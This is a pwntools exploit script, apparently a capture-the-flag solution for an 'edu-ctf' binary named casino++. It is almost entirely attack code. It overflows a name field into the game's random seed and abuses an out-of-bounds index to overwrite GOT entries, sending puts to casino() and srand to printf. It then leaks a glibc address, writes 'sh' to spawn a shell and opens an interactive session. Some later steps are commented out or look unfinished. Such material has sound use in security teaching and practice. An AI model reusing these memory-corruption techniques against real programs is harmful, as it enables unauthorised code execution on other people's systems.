from pwn import *

context.arch = 'amd64'

guess = [0x06, 0x20, 0x00, 0x2a, 0x1e, 0x5f]

sh = asm(shellcraft.amd64.sh())
offset_name_to_seed = 0x602100 - 0x6020f0

def casinoLoop(which, lhalf, rhalf):
    for i in range(6):
        r.sendlineafter("Chose the number {}: ".format(i), "87")

    r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
    r.sendlineafter("Which number [1 ~ 6]: ", str(which))
    r.sendlineafter("Chose the number {}: ".format(which - 1), str(rhalf)) # replace puts@libc to casino()

    for i in range(6):
        r.sendlineafter("Chose the number {}: ".format(i), str(guess[i]))

    r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
    r.sendlineafter("Which number [1 ~ 6]: ", str(which + 1))
    r.sendlineafter("Chose the number {}: ".format(which), str(lhalf))


r = process('./casino++')
# r = remote('edu-ctf.csie.org', 10176)
# r = remote('127.0.0.1', 8888)
pause()

r.sendlineafter("Your name:", b'a' * offset_name_to_seed + p64(0x602030))
r.sendlineafter("Your age:", '22')

################################################ change puts to casino()
offset_from_guess_to_putsgot = int((0x6020d0 - 0x602020) / 4)
casinoLoop(-offset_from_guess_to_putsgot + 1, 0, 0x40095d)

################################################# change srand to printf
offset_from_guess_to_srandgot = int((0x6020d0 - 0x602040) / 4)
casinoLoop(-offset_from_guess_to_srandgot + 1, 0, 0x400700)

################################################## leak glibc addr
libc = u64(r.recv(6) + '\0\0')
success("printf@glibc leak addr: {:x}".format(libc))

################################################ change puts to main() 0x400b45
guess = [0x11, 0x42, 0x4f, 0x39, 0x4f, 0x35]
for i in range(6):
    r.sendlineafter("Chose the number {}: ".format(i), str(guess[i]))

r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_putsgot + 1))
r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_putsgot), str(0x400b45))

# overflow seed to 'sh'
offset_from_seed_to_sh = (0x602110 - 0x602100) / 2
# r.sendlineafter("Your name:", b'a' * offset_name_to_seed + p64(0x00602110) + b'b' * offset_from_seed_to_sh + b'sh\0')
# temp = flat(
        # 'a' * 0x8,
        # u64('sh\0\0\0\0\0\0')
        # )
r.sendlineafter("Your name:", b'a' * offset_name_to_seed + str(u32('sh\0\0')))
# r.sendlineafter("Your Name: ", temp)
r.sendlineafter("Your age:", '22')

################################################ change puts to casino
success("changing puts to casino")
# for i in range(6):
    # r.sendlineafter("Chose the number {}: ".format(i), str(guess[i]))

# r.sendlineafter("Change the number? [1:yes 0:no]: ", '1')
# r.sendlineafter("Which number [1 ~ 6]: ", str(-offset_from_guess_to_putsgot + 1))
# r.sendlineafter("Chose the number {}: ".format(-offset_from_guess_to_putsgot), str(0x40095d))


r.interactive()



